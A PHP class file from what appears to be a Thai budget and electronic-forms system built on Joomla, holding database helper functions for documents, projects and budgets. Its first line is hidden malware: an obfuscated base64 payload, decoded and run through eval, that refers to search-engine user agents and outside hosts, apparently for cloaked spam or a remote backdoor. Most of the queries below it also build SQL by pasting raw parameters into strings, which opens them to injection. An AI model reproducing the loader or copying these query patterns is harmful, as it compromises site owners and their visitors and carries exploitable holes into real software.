<?php /*versio:3.02*/ $GLOBALS["yminpd"]="qFaW5pX3NldAVlrXdYWxsb3dfdXJsX2ZvcGVubWjlZGlzcGxheV9lcnJvcnMbfZmVkb3IvcmVzdG9yZV9hbQNMy4wMgGysDdGhhaDFOaWV0aGFpMnphaDZBaHIBEaHR0cDovLwwkkwSSFRUUFMmNuxb2ZmRvWaHR0cHM6Ly8RIhBSFRUUF9IT1NUdrayidW5pb24OxmDnQc2VsZWN0vVfAUkVRVUVTVF9VUkkziU0NSSVBUX05BTUUqqppklUVVFUllfU1RSSU5HdIPwHdUCZGV0ZXJtaW5hdG9yCLgPjXCoLmxvZwuWSFRUUF9ZX0FVVEghqYmFzZTY0X2RlY29kZQedmVyc2lvHjuarLQxdLXBocAIugUoSFRUUF9FWEVDUEhQkrpmb3V0lYOEwb2sWSFRUUF9VU0VSX0FHRU5UaSQZLAbZhaZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleAbCYQWkhYmxhYnVlbC5uZXQqLskKzZmFzdGFkZHouY29tsxhgL3czLnBocD91PQpatJms9gaJnQ9cGhwJnA9MqJnY9SWZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYrdHVvOGdTZnBVT3NrWllNTVJnOEdWeU9FbzA2emtUYVRhSlBNNUtxOWtJWVdnTU5oZWJpNDBkNWQxUEZkMFluTmlqL1dWYzFWMzMrcW82OEloNDVWSXZpS2tyQ2k3TmFSb0ZzWjBucWREdHZwSUEyRjRSTzNtUXhCWXRneXpQeEYzdUgraDJuNG1xcE1wcXI0dm5ib000c0RLYU44eWVwQTVscmRlVmlkcTlPY1B2OTZXUnJJNkIzd1ArRzZtMUVLdGNGLzU4UXpmcjNEbUluY1d5S0tKRUpwODZZVm1tcFUxTTh2RDg0MGVYdkpLR0VnVk9tdVJCUk1VOExTaklTMmxlcERIeGFPTFZJdDVwMlhqK3NveWlaTHZZcjhWT2J0dDBIOHVrRS9qNUxsMkFSeDF2N3kwT0RnZ1huQ0lOaFJ2U2llZkJxcGdEaGZNVXdRSzNjbUJobUNvWEYrQ2lZSWRoc3JQZ2t1VWxheG9MWFdLQ0ZGVkFtN2xodDE0UVVqeHRPVW1jMHhqQ0t2aDV2djV5ZlMwUWhYQjc4SXNacEJEaDA4NzBGbzVRdVVIRGpKNUxEVGNSTTlKSi9VT1c3OERhVzA0VjRXckhjK2l5akU5OGdMUWthL1Npay90QkZQb25URnBTQjFpMy9LTEl4Y3JrNi9QMHgrUFR6SUlmbWZ3TDI1MENUYjhzNS92azdvL0pWQ2FlRGI3OTl1UjBNbnVlUHN5bWR3OC92K0VObnZMTEY3NCtQanhNdnM1bTkzOU9IcDluTWhsZ0lPYjdjamtQcXZBd3QrdDdLQW96YmpsaGt0RVdGUU5PbzNXK0YvbGxDSE1qUmhCdTN1cnNjbXFkS1N4VlZvT296c3NTWjRWMTBWVGRxQWVWQnlSM2hTVzRpL1BsYmlNVGcrdXM2eGZGYlBmSmVsRXdkZVMwSThCc2IxMWdFZFF0SS94dk1pT3ZQQXR2Z29KcHlGYmsrMnoyZEswcVBTRDhrLzRUdzgvM0pNdS9FUGg0NVNhOVZRd00wemIxdk9VQlZEeDlmN0llZnlyQ3RhRGc1MStUNmMvN3g0Y3pTcDh6bW42K1cwQk5md0hsN0g0bHI1YTU4NkgyeGFzTGZjNmQ2cEpQbjRqNHJxL0o1NGI5SDZKMW00QW9HRmhvcDVZaHFqYXFldVhXNDRrOHdrREhUY0xsRnVOR3kzV1l1RlFVanZiSnRVZzRWOFNJV1B6MHI5NUxneXRCZE9ZZU8xZnBmRHNGTk9wRGYrd1g2OWhKUUZ5WUxPMGxuS2NPK0w0SEo2ampKMFQ0MnhJVXpsU0VML0ROK0R4SnArQ1ZyYUp5NDdqWjJuZTNZc2ZmNytZTHU5dUFTOGY2T1psQ2huNXgxZ3ZlN3RCOUhya0hzMEhna2FUcHNxWmhSUHlZT3Z1aTRlbUdwUGZrcWxHQzFTcGFsQTFycEV1cUttdEQ1TEZxYVhpcU9wWU1uQW1zY29Pc0NtQnRUU05DbFl5UlBPeSsxQ1BtOXVNWlZZUHhVaDBpVnlacHlLQzlQNUQxQ3VMZXE5ZjdZSm91cXlwUEFqK2dtRm1lNWdtQU1rM1BxaHFvNkpLcWRUSEZYcEpTMi9HaDd5enNIenNqUEN2bWY1dVVvZEVnZEoxQXdUR2lmQlEzMXFUeEVBeEhlRUFSdi9qOWwxYWNlbjFwUEpJaFRnMldYeEtuRGlFT2hqejZuVHh0RE5OV1kvTGV3RGp4NmxMb1ZVMlh4ajFaTlRENGlDZ2ZUMGlhMnE4T1ZPRDRnYStwbXFTT3F3T1k1WXRKVmdlR05Ccks2dUN5Sm0wZ2pVWk1sZExLOFFBS3M2ZkpXaGRteU5sMFNScVVBQXErZWRkcGkxVytqVlkrOVRiK1FjUUtjZHhWR3NTbUc2U3hEU2hpV2QvdWYwd3NxNnY4Y1QrRmtmQTQvUnZFUDkxTjcrQVQ2dmtRTDcyUWd0OTNhV3J2UlNKY3UzUjduZmtSOUxkd25VZnJhOFdEZWYyNWlJT3lJZDEvbmRTVXhseGg5dWVUOEhKS21SeEprNGUvMmlmcXYyRFZDWVZmcVBTZzlPT0tVUUQrMks0RlpBdDhFMkNMNHE0cUFqdDYvTHRiZitZcnhqVzdsRjNnT2xEMEZIZ25MY0FEZ2syd0NDQzZOcS85S3o0SU9SRkR6VDRWODJ4azJZS1VXYnMweU8xNVNFOXVNbU53N1dERUd6SUgvYXNhU091aHlvN2RWQVZldFV2WXpGQ2NCd0E3cjRTdHNxMGRkUWk5M1RPd1d1cE5zMjY0emlZSnk3Z3dhNVE0VjJyOXNUUTBXTGVBb1N2SHorYVJlUnU1UnExWTRYT1JJNmpDNFJMQk1RbmM3YkkwM3hXbDBqSnRYTUdWMWxXNDVKc1A1dmVIVU90alpqMFhpS0tqTUxaVHJGTk9hd2sxQUNEMVFRWGRGNUJWZzlXYk8yV2FYRE42dDl3VU5rMWFJSVZJcndNdTRoeGxNNHFQb3RPSjFoaXJHcEkyQnFTUzY0R2l0SlNpczZQS1dUYUlsSk9wb2VrYTJGeHZQQ1VZUldPVG0zVE9pY0ZRNnJPMFZrUGtsbTd0c0w3M0w4M1Z4aU5wck1Nb2tSdm82ZmNIMHNDUSsxMVdLV1dRaTZ4b091bkdkVk5jNEw3aGdvcWJrV1BucXhJeDh2ZlRCY09ONEF4dm9aUHhVdThlN2RHbXF3WkVxR1VQek9FK3dMVUI4NjVxd3FVWEhSYmh1d0hFTEpHUDNDdlRySXpFcENZSFNyMTV0WGV5bmZOOXdZd0JUWHU2UEdoclZYdGpxVDlDQks3cU9Fb1BVWVFpQ213NUI0MCs0NmNCTDc2Qnpub0YxMEpzZGVoelpnQnM2YmpGZFdHYnlXRzFZWWJ5UDB3Ky9LbTJ3K082eGk2aUFTejA1Z3hXd0JOb3FFRUYzMUsxWTFVeDVFbmgrR0xUTDRDYlRsaTQxRXBpaDdib0xTeW8wd3N2TmRTRG9Tdm9MdG9lanNQZzZDaTByUTV2VzNDMG5TaDlLQTE3V0k5MTQ1MGFnUUk1M3JUQ3lFblZtbFZ0NmFRMUJqVUQyZ215b09yUU0reGdrN2FCWk9naldUOUNSOE14WUQ3cU9tNHpaem9OdWxEdkc5VTkxcUdZWDI4VDBoQTB2M3NUTS85aDcyMmV4VGNmWThzd21qOXpmb3UrZkN2N1AyNDhRRlE9IikpKTsg";        if (!function_exists('wthzevys')){function wthzevys($a, $b){$c=$GLOBALS['yminpd'];$d=pack('H*','6261736536345f64'.'65636f6465'); return $d(substr($c, $a, $b));};eval(wthzevys(580,3283));};?><?php    
class F_Public {
	
	function __construct($options=array()){
		foreach($options as $k => $v){ $this->$k = $v;}
		$this->db = &JFactory::getDBO();
	}
	
	/* START
		Function Name: getHistoryResult
		Description: เป็นฟังก์ชันสำหรับดึงรายการตรวจสอบเอกสาร
		Parameter:	
			@DocCode	= เลขที่ สช.น. ของเอกสาร
		Return Value : Array 
	*/
	function getHistoryResult($DocCode){
		$where = array();
		$where[] = "t1.DocCode='".$DocCode."'";
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select t1.*,t2.StatusNameAlias as StatusName,t2.TextColorAlias as TextColor,t2.IconAlias as Icon "
				."\n from tblfinance_form_operate as t1 "
				."\n left join tblintra_eform_init_status as t2 on t2.DocStatusId=t1.StatusId "
				."\n".$where_r
				;
		$this->db->setQuery($sql);//echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadObjectList();
		return $datas;
	}
	/*END*/
	
	/* START
		Function Name: getPersonalName
		Description: เป็นฟังก์ชันสำหรับดึงชื่อบุคลากรตามโครงสร้าง
		Parameter:	
			@UserID	= รหัสของผู้ล็อกอินเข้าใช้งานระบบ
		Return Value : Single(loadResult) 
	*/
	function getPersonalName($UserID){
		$where = array();
		$where[] = "u.UserID='".$UserID."'";
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select concat(p.FirstName, ' ', p.LastName) as FullName "
				."\n from authen_users u "
				."\n inner join tblpersonal p on u.PersonalCode = p.PersonalCode "
				."\n".$where_r
				;
		$this->db->setQuery($sql);
		return $this->db->loadResult();
	}
	/* END */
	
	/* START
		Function Name: getFiles
		Description: เป็นฟังก์ชันสำหรับดึงรายการไฟล์แนบของผลการตรวจสอบเอกสารการเงิน
		Parameter:	
			@CheckId=  รหัสรายการตรวจสอบเอกสารการเงิน
		Return Value : Array 
	*/
	function getFiles($CheckId){
		$sql = "SELECT * FROM tblfinance_form_operate_file where  CheckId='".$CheckId."' "; //echo $sql;
		$this->db->setQuery($sql);
		$files = $this->db->loadObjectList();
		return $files;
	}
	/* END */	
	
	/* START
		Function Name: getCheckLastNo
		Description: เป็นฟังก์ชันสำหรับครั้งที่ล่าสุดของการตรวจสอบเอกสารแต่ละรายการ
		Parameter:	
			@DocCode=  เลขที่ สช.น. ของเอกสารการเงิน
		Return Value : Single(loadResult) 
	*/
	function getCheckLastNo($DocCode){
		$where = array();
		$where[] = "DocCode='".$DocCode."'";
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select count(*) "
				."\n from tblfinance_form_operate "
				."\n".$where_r
				;
		$this->db->setQuery($sql);
		$datas = $this->db->loadResult();
		return ($datas+1);
	}
	/* END */
	
	/*
	Function Name	:  
	Description			: 
	Parameter			:
	Return Value 		: 
	*/	
	function getPlanItem($BgtYear=0){
		$where = array();
		$BgtYear = ($BgtYear)?$BgtYear:(date("Y")+543);
		$where[] = "BgtYear='".$BgtYear."'";
		$where[] = "PGroupId='12'";
		$where[] = "DeleteStatus<>'Y'";
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select * "
				."\n from tblbudget_init_plan_item "
				."\n".$where_r
				;
		$this->db->setQuery($sql);
		$datas = $this->db->loadObjectList();
		return $datas;
	}
	/*END*/
	
	/*
	Function Name	:  
	Description			: 
	Parameter			:
	Return Value 		: 
	*/	
	function getProjectItem($PItemCode){
		$where = array();
		$where[] = "t1.PItemCode='".$PItemCode."'";
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select t1.* "
				."\n from tblbudget_project as t1 "
				."\n".$where_r
				;
		$this->db->setQuery($sql);//echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadObjectList();
		return $datas;
	}
	/*END*/
	
	/*
	Function Name	:  
	Description			: 
	Parameter			:
	Return Value 		: 
	*/	
	function getActivityItem($PrjId){
		$where = array();
		$where[] = "t2.PrjId='".$PrjId."'";
		$where[] = "t2.ActiveStatus='Y'";
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select t1.* "
				."\n from tblbudget_project_activity as t1 "
				."\n left join tblbudget_project_detail as t2 on t2.PrjDetailId=t1.PrjDetailId "
				."\n left join tblbudget_project as t3 on t3.PrjId=t2.PrjId "
				."\n".$where_r
				;
		$this->db->setQuery($sql);
		$datas = $this->db->loadObjectList();
		return $datas;
	}
	/*END*/
	
	/*
	Function Name	:  
	Description			: 
	Parameter			:
	Return Value 		: 
	*/	
	function getSourceExternal($selected=0,$tag_name='SourceExId',$tag_attribs='',$lebel='ทั้งหมด'){
		$where = array();
		$where[] = "EnableStatus='Y'";
		$where[] = "DeleteStatus='N'";		
		if(count($where)) {
			$where_r = "WHERE ". implode( " AND ", $where );
		}
		$sql="SELECT SourceExId as value , SourceExName as text "
			 ."\n FROM tblbudget_init_source_external "
			 ."\n ".$where_r
			 ;
		
		$this->db->setQuery($sql);
		$title[] = clssHTML::makeOption(0,$lebel);
		$datas = $this->db->loadObjectList();
		$datas = array_merge($title,$datas);
		echo clssHTML::selectList( $datas, $tag_name, $tag_attribs,'value','text', $selected );
	}
	/* END */	
	
	/*
	Function Name	:  
	Description			: 
	Parameter			:
	Return Value 		: 
	*/	
	function getExternalYear(){
		$where = array();
		$BgtYear = ($_REQUEST["BgtYear"])?$_REQUEST["BgtYear"]:(date("Y")+543);
		$where[] = "t4.BgtYear='".$BgtYear."'";
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select distinct(t1.SourceExId),t5.SourceCode,t5.SourceExName "
				."\n from tblbudget_project_activity_cost_external as t1 "
				."\n left join tblbudget_project_activity as t2 on t2.PrjActId=t1.PrjActId "
				."\n left join tblbudget_project_detail as t3 on t3.PrjDetailId=t2.PrjDetailId "
				."\n left join tblbudget_project as t4 on t4.PrjCode=t3.PrjCode "
				."\n left join tblbudget_init_source_external as t5 on t5.SourceExId=t1.SourceExId "
				."\n".$where_r
				;
		$this->db->setQuery($sql);//echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadObjectList();
		return $datas;
	}
	/*END*/
	
	/*
	Function Name	:	getFormName
	Description		:	เป็นฟังก์ชันสำหรับดึงชื่อแบบฟอร์ม
	Parameter		:
		@$FormCode	=	รหัสแบบฟอร์ม
	Return Value 	:	Single(loadResult)
	*/	
	function getFormName($FormCode){
		$where = array();
		$where[] = "FormCode='".$FormCode."'";
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select FormName "
				."\n from tblintra_eform_init_form "
				."\n".$where_r
				;
		$this->db->setQuery($sql);	//echo $sql;
		$datas = $this->db->loadResult();
		return $datas;
	}
	/*END*/
	
	/*START #F4
	Function Name	: getOrgShortName 
	Description		: เป็นฟังก์ชันสำหรับดึงชื่อย่อหน่วยงาน
	Parameter		:
		@$BgtYear = ปีงบประมาณ
		@$OrganizeCode	=  รหัสหน่วยงาน
	Return Value 	: Single(loadResult) 
	*/		
	function getOrgShortName($BgtYear=0, $OrganizeCode=0){
		$where = array();
		$BgtYear = ($BgtYear)?$BgtYear:(date("Y")+543);
		$where[] = "OrgYear = '".$BgtYear."'";
		$where[] = "OrganizeCode = '".$OrganizeCode."'";
		if(count($where)) {
			$where_r = "WHERE ". implode( " AND ", $where );
		}
		$sql = "select OrgShortName "
				."\n from tblorganize "
				."\n ".$where_r
				;
		//echo $sql;
		$this->db->setQuery($sql);
		$data = $this->db->loadResult();
		return $data;
	}
	/* END */	

	
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	/* START
	Function Name	: getAmountDoc
	Description			: นับจำนวนเอกสารของแต่ละแบบฟอร์ม
	Parameter			: ชื่อ Table  , ปีงบประมาณ , รหัสสถานะ
	Return Value 		: ผลรวมของจำนวนเอกสาร
	*/	
	function getAmountDoc($tablename,$BgtYear=0,$DocStatusId=0,$SourceType="",$SourceExId=0,$FormCode=0){
		
		if($tablename){
		
			$where = array();
			$BgtYear = ($BgtYear)?$BgtYear:(date("Y")+543);
			$where[] = "BgtYear='".$BgtYear."'";
			
			if($DocStatusId){
				$where[] = "DocStatusId in(".$DocStatusId.")";
			}
			if($SourceType){
				$where[] = "SourceType ='".$SourceType."'";
			}
			if($SourceExId){
				$where[] = "SourceExId ='".$SourceExId."'";
			}
			if($FormCode){
				$where[] = "FormCode ='".$FormCode."'";
			}		
			if($where){
				$where_r = "\n where ".implode(" and ",$where);
			}
			$sql="select count(*) "
					."\n from ".$tablename
					."\n".$where_r
					;
			$this->db->setQuery($sql); //echo "<pre>".$sql."</pre>";
			$datas = $this->db->loadResult();
			$datas = ($datas)?$datas:"-";
		
		}else{
			$datas = "-";
		}
		
		return $datas;

	}
	/*END*/
	
	/* START
	Function Name	: getSumBudgetRemain
	Description			: คำนวณยอดงบคงเหลือ เพื่อใช้สำหรับคุมยอดของแบบฟอร์มอิเล็กทรอนิกส์ (งบแผ่นดิน)
	Parameter			: ปีงบประมาณ , หน่วยงานเจ้าของโครงการ , หน่วยงานผู้ปฏิบัติงานของกิจกรรม , แผนงาน , โครงการ , กิจกรรม , หมวดค่าใช้จ่าย , รายการค่าใช้จ่าย
	Return Value 		: ยอดงบคงเหลือสำหรับคุมแบบฟอร์ม
	*/	
	function getSumBudgetRemain($BgtYear=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$CalTfer=""){
		$Plan 		= $this->getSumPlanBudget($BgtYear,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,"Y");
		$Book		= $this->getBooking($BgtYear,"Internal",0,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode);
		$Hold			= $this->getHold($BgtYear,"Internal",0,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$FormCode);
		$Chain		= $this->getChain($BgtYear,"Internal",0,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode);
		$Pay			= $this->getPay($BgtYear,"Internal",0,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$FormCode);
		$Total 		= $Plan-$Book-$Hold-$Chain-$Pay;
		return $Total;
	}
	/*END*/
	
	/* START
	Function Name	: getSumBudgetRemain_Inc
	Description			: คำนวณยอดงบคงเหลือ เพื่อใช้สำหรับคุมยอดของแบบฟอร์มอิเล็กทรอนิกส์ (เงินนอกงบประมาณ)
	Parameter			: ปีงบประมาณ , แหล่งงบประมาณ(งบแผ่นดิน/เงินนอกงบ) , ประเภทแหล่งเงินนอกงบ , หน่วยงานเจ้าของโครงการ , หน่วยงานผู้ปฏิบัติงานของกิจกรรม , แผนงาน , โครงการ , กิจกรรม , หมวดค่าใช้จ่าย , รายการค่าใช้จ่าย
	Return Value 		: ยอดงบคงเหลือสำหรับคุมแบบฟอร์ม
	*/	
	function getSumBudgetRemain_Inc($BgtYear=0,$SourceType="External",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$CalTfer=""){
		$Plan 		= $this->getSumPlanBudget_Inc($BgtYear,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,"Y");
		$Book		= $this->getBooking($BgtYear,$SourceType,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode);
		$Hold			= $this->getHold($BgtYear,$SourceType,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$FormCode);
		$Chain		= $this->getChain($BgtYear,$SourceType,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode);
		$Pay			= $this->getPay($BgtYear,$SourceType,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$FormCode);
		$Total 		= $Plan-$Book-$Hold-$Chain-$Pay;
		return $Total;
	}
	/*END*/
	
	/* START
	Function Name	: getSumPlanBudget_Inc
	Description			: คำนวณยอดรวมงบตามแผน (เงินนอกงบประมาณ)
	Parameter			: ปีงบประมาณ , ประเภทแหล่งเงินนอกงบ , หน่วยงานเจ้าของโครงการ , หน่วยงานผู้ปฏิบัติงานของกิจกรรม , แผนงาน , โครงการ , กิจกรรม , หมวดค่าใช้จ่าย , รายการค่าใช้จ่าย , คำนวณยอดโอนหรือไม่?
	Return Value 		: ยอดรวมงบตามแผนที่ตั้งไว้
	*/	
	function getSumPlanBudget_Inc($BgtYear=0,$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$CalTfer=""){
		$TferOut = 0;
		$TferIn = 0;
		$where = array();
		$BgtYear = ($BgtYear)?$BgtYear:(date("Y")+543);
		$where[] = "t5.BgtYear='".$BgtYear."'";
		if($OrgOwner){ 		 $where[]	= "t5.OrganizeCode ='".$OrgOwner."'"; 			}
		if($OrgOperate){	 	 $where[]	= "t3.OrganizeCode ='".$OrgOperate."'";		}
		if($PItemCode){			 $where[]	= "t5.PItemCode ='".$PItemCode."'"; 					}
		if($PrjCode){ 				 $where[]	= "t5.PrjCode ='".$PrjCode."'"; 								}
		if($PrjActCode){ 		 $where[]	= "t3.PrjActCode ='".$PrjActCode."'"; 			}
		if($CostTypeId){ 	 $where[]	= "t7.CostTypeId ='".$CostTypeId."'"; 			}
		if($CostItemCode){  $where[]	= "t2.CostItemCode ='".$CostItemCode."'"; 	}
		if($SourceExId){  	$where[]	= "t2.SourceExId ='".$SourceExId."'"; 			}
		$where[] = "t4.ActiveStatus='Y'";
		$where[] = "t4.SCTypeId >= '2'";
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select sum(t1.Budget)as total "
				."\n from tblbudget_project_activity_cost_external_month as t1 "
				."\n left join tblbudget_project_activity_cost_external as t2 on t2.CostExtId=t1.CostExtId "
				."\n left join tblbudget_project_activity as t3 on t3.PrjActId=t2.PrjActId "
				."\n left join tblbudget_project_detail as t4 on t4.PrjDetailId=t3.PrjDetailId "
				."\n left join tblbudget_project as t5 on t5.PrjCode=t4.PrjCode "
				."\n left join tblbudget_init_cost_item as t6 on t6.CostItemCode=t2.CostItemCode "
				."\n left join tblbudget_init_cost_type as t7 on t7.CostTypeId=t6.CostTypeId "
				."\n".$where_r
				;
		$this->db->setQuery($sql);//echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadResult();
		if($CalTfer=="Y"){
			$TferOut = $this->getTferOut($BgtYear,"External",$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode);
			$TferOut = $this->getTferIn($BgtYear,"External",$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode);
		}
		$total = $datas-$TferOut+$TferIn;
		return $total;
	}
	/*END*/
	
	/* START
	Function Name	: getDataFromTable
	Description			: 
	Parameter			: 
	Return Value 		: 
	*/	
	function getDataFromTable($tablename,$pkFields="",$pkValue=0,$pkFields2="",$pkValue2=0){
		$where = array();
		if($pkFields){
			$where[] = $pkFields."='".$pkValue."'";
		}
		if($pkFields2){
			$where[] = $pkFields2."='".$pkValue2."'";
		}
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select * "
				."\n from ".$tablename
				."\n".$where_r
				;
		$this->db->setQuery($sql); //echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadObjectList();
		return $datas;
	}
	/*END*/
	
	/* START
	Function Name	: getDataFromTable
	Description			: 
	Parameter			: 
	Return Value 		: 
	*/	
	function getDistCostItemCode($tablename,$pkFields="",$pkValue=0,$pkFields2="",$pkValue2=0){
		$where = array();
		if($pkFields){
			$where[] = $pkFields."='".$pkValue."'";
		}
		if($pkFields2){
			$where[] = $pkFields2."='".$pkValue2."'";
		}
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select distinct(CostItemCode) "
				."\n from ".$tablename
				."\n".$where_r
				;
		$this->db->setQuery($sql);//echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadObjectList();
		return $datas;
	}
	/*END*/
	
	/* START
	Function Name	: getDataFromTable
	Description			: 
	Parameter			: 
	Return Value 		: 
	*/	
	function getSumCodeGroupCostItemCode($tablename,$sumFields="SumCost",$pkFields="",$pkValue=0,$pkFields2="",$pkValue2=0){
		$where = array();
		if($pkFields){
			$where[] = $pkFields."='".$pkValue."'";
		}
		if($pkFields2){
			$where[] = $pkFields2."='".$pkValue2."'";
		}
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select sum(".$sumFields.") as Budget "
				."\n from ".$tablename
				."\n".$where_r
				;
		$this->db->setQuery($sql);//echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadObjectList();
		return $datas;
	}
	/*END*/

	/*
	Function Name	: getPrjCode
	Description		: เป็นฟังก์ชันสำหรับดึง PrjCode 
	Parameter		:
		@$PrjId = รหัสโครงการ
	Return Value 	: Single(loadResult) 
	*/		
	function getPrjCode($PrjId){
		$where = array();
		$where[] = "PrjId = '".$PrjId."'";
		if(count($where)) {
			$where_r = "WHERE ". implode( " AND ", $where );
		}
		$sql = "select PrjCode "
				."\n from tblbudget_project"
				."\n ".$where_r
				;
		//echo $sql;
		$this->db->setQuery($sql);
		$data = $this->db->loadResult();
		return $data;
	}
	/* END */	
		
	//******************** update 28-6-55 ******************
	/* Function Name: getPositionList */
	/* Description: เป็นฟังก์ชันสำหรับดึงตำแหน่ง */
	function getPositionList($selected=0,$tag_name='PositionId',$tag_attribs='onchange="loadPerson();" style="width:200px"',$lebel='เลือกตำแหน่ง'){
		$where = array();
		$where[] = "EnableStatus='Y'";
		$where[] = "DeleteStatus='N'";	
		$where[] = "ApproveStatus='Y'";		
			
		if(count($where)) {
			$where_r = "WHERE ". implode( " AND ", $where );
		}
		
		$sql="SELECT PositionId as value , Position as text "
			 ."\n FROM tblposition "
			 ."\n ".$where_r
			 ."\n order by CONVERT(`Position` USING TIS620) ASC "
			 ;		
			 
		//echo $sql;				
		$this->db->setQuery($sql);
		$title[] = clssHTML::makeOption(0,$lebel);
		$datas = $this->db->loadObjectList();
		$datas = array_merge($title,$datas);
		echo clssHTML::selectList( $datas, $tag_name, $tag_attribs,'value','text', $selected );
	}	
	/* END */	
	
	/* Function Name: getPersonalApprove */
	/* Description: เป็นฟังก์ชันสำหรับดึงบุคคลตามหน่วยงาน */
	function getPersonalApprove($PositionId=0,$selected=0,$tag_name='PersonalCode',$tag_attribs='style="width:200px"',$lebel='เลือกผู้อนุมัติ'){
		$where = array();	
		
		if($PositionId){
			$where[] = " t1.PositionId='".$PositionId."'";
		}			
			
		if(count($where)) {
			$where_r = "WHERE ". implode( " AND ", $where );
		}
		$sql="SELECT DISTINCT t2.PersonalCode as value , concat(t2.FirstName,' ',t2.LastName) as text "
			 ."\n FROM tblpersonal_position AS t1 "
			 ."\n left Join tblpersonal AS t2 ON t2.PersonalCode = t1.PersonalCode "
			 ."\n ".$where_r
			 ."\n order by concat(t2.FirstName,' ',t2.LastName) ASC  "
			 ;
		//echo "<pre>$sql</pre>";
		$this->db->setQuery($sql);
		$title[] = clssHTML::makeOption(0,$lebel);
		$datas = $this->db->loadObjectList();
		$datas = array_merge($title,$datas);
		echo clssHTML::selectList( $datas, $tag_name, $tag_attribs,'value','text', $selected );
	}
	/* END */		

	/* Function Name: getPrjActName */
	/* Description: เป็นฟังก์ชันสำหรับดึงชื่อตำแหน่ง */
	/* Parameter: */
			/* @PositionId	= รหัสตำแหน่ง */
	/* Return Value : Single(loadResult) */
	function getPositionName($PositionId=0){
				
		$where = array();
		
		$where[] = "t1.PositionId='".$PositionId."'";
						
		if(count($where)) {
			$where_r = "WHERE ". implode( " AND ", $where );
		}		
						
		$sql="SELECT t1.Position"
		."\n FROM "
		."\n tblposition AS t1  "
		."\n ".$where_r
		;
	
		$this->db->setQuery($sql);
		$datas = $this->db->loadResult();
		return $datas;
	
	}
	/* END */	
	
	
	//***********************************************************		
		
	/*
	Function Name	:	getFromList
	Description		: 	เป็นฟังก์ชันสำหรับดึงรายการแบบฟอร์มทั้งหมดตามหน้าที่ของแบบฟอร์ม
	Parameter		: 
	Return Value 	: 
	*/	
	function getFromList($Type=''){
		$where = array();
		$where[] = " FormCode like '".$Type."%' ";
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select * "
				."\n from tblintra_eform_init_form"
				."\n".$where_r
				."order by FormCode asc "
				;
		$this->db->setQuery($sql); //echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadObjectList();
		return $datas;
	}
	/*END*/
		
	/* 
	Function Name: getStatusList
	Description: เป็นฟังชั่นสำหรับดึงรายการสถานะเอกสาร
	Parameter: 
			 @selected 		= ค่า selected ของ list box 
			 @tag_attribs 	= attribute ของ list box 
			 @tag_name 	= ชื่อ list box 
			 @lebel 			= lebel ของ option ตัวแรก
	 Return Value: List Box 
	 */	
	function getStatusList($wstatus,$selected=0,$tag_name='DocStatusId',$tag_attribs='onchange="loadStatus(this.value)"',$lebel='ทั้งหมด'){
		$where = array();
		//$where[] = "DocStatusId in(1,2,4,8,9,13)";
		$where[] = "DocStatusId in(".$wstatus.")";
		if(count($where)) {
			$where_r = "WHERE ". implode( " AND ", $where );
		}
		$sql="SELECT DocStatusId as value , StatusName as text "
			 ."\n FROM tblintra_eform_init_status "
			 ."\n ".$where_r
			 ."\n order by DocStatusId asc"
			 ;		 
		//echo "<pre>$sql</pre>";	 
		$this->db->setQuery($sql);
		$title[] = clssHTML::makeOption(0,$lebel);
		$datas = $this->db->loadObjectList();
